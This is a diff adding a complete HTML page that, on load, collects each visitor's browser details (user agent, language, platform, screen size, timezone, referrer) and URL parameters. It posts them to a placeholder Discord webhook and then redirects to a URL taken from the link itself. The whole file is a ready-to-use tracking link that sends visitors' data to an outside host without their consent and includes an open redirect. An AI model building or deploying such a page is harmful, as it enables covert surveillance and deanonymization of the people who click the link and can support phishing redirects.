@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Collection and Redirect</title>
+    <script>
+        // Function to get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            const results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Function to gather data
+        function gatherData() {
+            const data = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                id: getUrlParameter('id'),
+                url: getUrlParameter('url')
+            };
+
+            return data;
+        }
+
+        // Function to send data to Discord webhook
+        function sendToDiscord(data) {
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            const message = {
+                content: `**Data Collected:**\n${JSON.stringify(data, null, 2)}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            }).then(() => {
+                // Redirect to the URL after sending the data
+                if (data.url) {
+                    window.location.href = data.url;
+                }
+            });
+        }
+
+        // On page load, gather data and send it
+        window.onload = function () {
+            const data = gatherData();
+            sendToDiscord(data);
+        };
+    </script>
+</head>
+<body>
+    <h1>Data is being collected and sent...</h1>
+</body>
+</html>
